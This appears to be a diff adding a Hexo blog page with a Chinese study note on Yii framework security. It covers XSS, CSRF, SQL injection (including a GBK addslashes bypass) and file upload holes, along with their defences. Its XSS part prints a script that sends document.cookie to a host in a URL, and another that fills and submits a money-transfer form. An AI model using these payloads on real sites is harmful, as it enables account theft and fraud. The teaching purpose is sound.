@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Yii 框架之安全篇 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="XSS 攻击和防范之存储XSS 全称
+XSS 概念
+XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许恶意 Web 用户将代码植入到提供给其它用户使用的页面中，从而对用户进行攻击
+如何使用 XSS 攻击盗取用户账号12var cookie = document.cookie;window.location.href = &amp;quot;http://127.0.0.1/index.php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Yii 框架之安全篇">
+<meta property="og:url" content="http://yoursite.com/2016/10/29/Yii-框架之安全篇/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="XSS 攻击和防范之存储XSS 全称
+XSS 概念
+XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许恶意 Web 用户将代码植入到提供给其它用户使用的页面中，从而对用户进行攻击
+如何使用 XSS 攻击盗取用户账号12var cookie = document.cookie;window.location.href = &amp;quot;http://127.0.0.1/index.php">
+<meta property="og:updated_time" content="2016-11-01T13:22:57.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Yii 框架之安全篇">
+<meta name="twitter:description" content="XSS 攻击和防范之存储XSS 全称
+XSS 概念
+XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许恶意 Web 用户将代码植入到提供给其它用户使用的页面中，从而对用户进行攻击
+如何使用 XSS 攻击盗取用户账号12var cookie = document.cookie;window.location.href = &amp;quot;http://127.0.0.1/index.php">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Yii-框架之安全篇" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/10/29/Yii-框架之安全篇/" class="article-date">
+  <time datetime="2016-10-29T13:05:35.000Z" itemprop="datePublished">2016-10-29</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/PHP/">PHP</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Yii 框架之安全篇
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="XSS-攻击和防范之存储"><a href="#XSS-攻击和防范之存储" class="headerlink" title="XSS 攻击和防范之存储"></a>XSS 攻击和防范之存储</h2><p>XSS 全称</p>
+<p>XSS 概念</p>
+<p>XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许恶意 Web 用户将代码植入到<br>提供给其它用户使用的页面中，从而对用户进行攻击</p>
+<h3 id="如何使用-XSS-攻击盗取用户账号"><a href="#如何使用-XSS-攻击盗取用户账号" class="headerlink" title="如何使用 XSS 攻击盗取用户账号"></a>如何使用 XSS 攻击盗取用户账号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">var cookie = document.cookie;</div><div class="line">window.location.href = &quot;http://127.0.0.1/index.php?cookie=&quot;+cookie;</div></pre></td></tr></table></figure>
+<ul>
+<li>问题如下：document.cookie 获取得到的 cookie 是什么样的</li>
+<li>index.php 是如何处理 cookie 值的</li>
+<li>有了 cookie 怎么就能进行盗取账号的</li>
+</ul>
+<p>httponly 阻止 js 读取 cookie</p>
+<p>哪一段 js 代码能够自动转账<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">document.getElementById(&apos;ipt-search-key&apos;).value=&apos;withyz@xx.com&apos;;</div><div class="line">document.getElementById(&apos;amount&apos;).value=&apos;100&apos;;</div><div class="line">document.getElementById(&apos;reason&apos;).value=&apos;劫富济贫&apos;;</div><div class="line">document.getElementsByClassName(&apos;ui-button-text&apos;)[0].click();</div></pre></td></tr></table></figure></p>
+<p>如何把 js 注入到转账页面中</p>
+<h2 id="XSS-攻击和防范之反射"><a href="#XSS-攻击和防范之反射" class="headerlink" title="XSS 攻击和防范之反射"></a>XSS 攻击和防范之反射</h2><p>现代现浏览器(chrome)对于反射型XSS有一定防护<br>手动关闭：\Yii::$app-&gt;response-&gt;headers-&gt;add(‘X-XSS-Protection’, ‘0’);</p>
+<p>HTML 实体编码<br>URL 编码</p>
+<h2 id="XSS-攻击和防范之蠕虫"><a href="#XSS-攻击和防范之蠕虫" class="headerlink" title="XSS 攻击和防范之蠕虫"></a>XSS 攻击和防范之蠕虫</h2><h3 id="Yii-如何防范-XSS"><a href="#Yii-如何防范-XSS" class="headerlink" title="Yii 如何防范 XSS"></a>Yii 如何防范 XSS</h3><p>转码防范<br>\yii\helpers\Html::encode($script);</p>
+<p>过滤防范<br>\yii\helpers\HtmlPurifier::process($js);</p>
+<h2 id="CSRF-攻击和防范"><a href="#CSRF-攻击和防范" class="headerlink" title="CSRF 攻击和防范"></a>CSRF 攻击和防范</h2><p>跨站请求伪造</p>
+<p>get型的crtf攻击<br>构造url, 诱使用户点击</p>
+<p>透过例子能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
+<p>yii 框架 csrf token 验证过程</p>
+<p>检查Referer字段<br>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于www.examplebank.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于www.examplebank.com之下，这时候服务器就能识别出恶意的访问。<br>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。<br>添加校验token<br>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p>
+<h2 id="SQL-注入和防范"><a href="#SQL-注入和防范" class="headerlink" title="SQL 注入和防范"></a>SQL 注入和防范</h2><p>addslashes() 转义函数 防范 SQL 注入</p>
+<p>Sql注入：将要执行的sql语句采用拼接的方式组装时，就sql注入的可能；<br>原本要查询的字符串在拼接后发生发“越狱”，部分字符串被数据库识别成可执行语句，<br>导致意外的操作和查询结果<br>防范：1，屏蔽关键字和敏感词，有影响业务逻辑的可能；<br>2， 对传入变量转义，避免变量的内容越狱</p>
+<p>绕过转义：<br>char(0xdf)/‘,在utf-8下会变成β/‘,<br>而在gbk下由于汉字是2个字节组成；在数据中将变成 運’,单引号逃过了被转义</p>
+<p>使用PDO统一数据库接口，可以无痛切换；<br>使用占位符防范SQL注入</p>
+<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>文件上传漏洞<br>如果后台对文件上传审查不严，导致php代码上传后被执行，可进行遍历文件等操作使源码泄露</p>
+<p>用 fiddler 可以拦截请求,然后修改请求的内容,比如图片中的文件名,修改成如上形式后,会生成一个php文件,然后在上传后的目录执行php文件会造成危害</p>
+<p>保存上传过来的文件名的时候不要用用户本来的名称,容易在中途被非法修改,从而变成.php这些可执行文件,造成损害</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/10/29/Yii-框架之安全篇/" data-id="cixwy9h8f00156l4b0fz73g0s" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Yii/">Yii</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/11/03/Yii-框架之工具篇/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Yii 框架之工具篇
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/10/29/Yii-框架之扩展篇/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Yii 框架之扩展篇</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/MySQL/">MySQL</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Tooling/">Tooling</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/UML/">UML</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AliCloud/">AliCloud</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Laravel/">Laravel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL/">MySQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHPStorm/">PHPStorm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sublime-Text-3/">Sublime Text 3</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UML/">UML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Yii/">Yii</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/AliCloud/" style="font-size: 10px;">AliCloud</a> <a href="/tags/Laravel/" style="font-size: 20px;">Laravel</a> <a href="/tags/Linux/" style="font-size: 20px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 18px;">MySQL</a> <a href="/tags/PHP/" style="font-size: 14px;">PHP</a> <a href="/tags/PHPStorm/" style="font-size: 12px;">PHPStorm</a> <a href="/tags/Sublime-Text-3/" style="font-size: 10px;">Sublime Text 3</a> <a href="/tags/UML/" style="font-size: 10px;">UML</a> <a href="/tags/Yii/" style="font-size: 16px;">Yii</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2016/12/08/学习-UML（一）/">学习 UML（一）</a>
+          </li>
+        
+          <li>
+            <a href="/2016/12/02/Yii2-Working-with-Databases/">Yii2 Working with Databases</a>
+          </li>
+        
+          <li>
+            <a href="/2016/11/22/关于-PHP-函数-array-walk-的一些想法/">关于 PHP 函数 array_walk 的一些想法</a>
+          </li>
+        
+          <li>
+            <a href="/2016/11/21/关于-PHP-函数-array-filter-的一些想法/">关于 PHP 函数 array_filter 的一些想法</a>
+          </li>
+        
+          <li>
+            <a href="/2016/11/21/关于-PHP-函数-array-map-的一些想法/">关于 PHP 函数 array_map 的一些想法</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
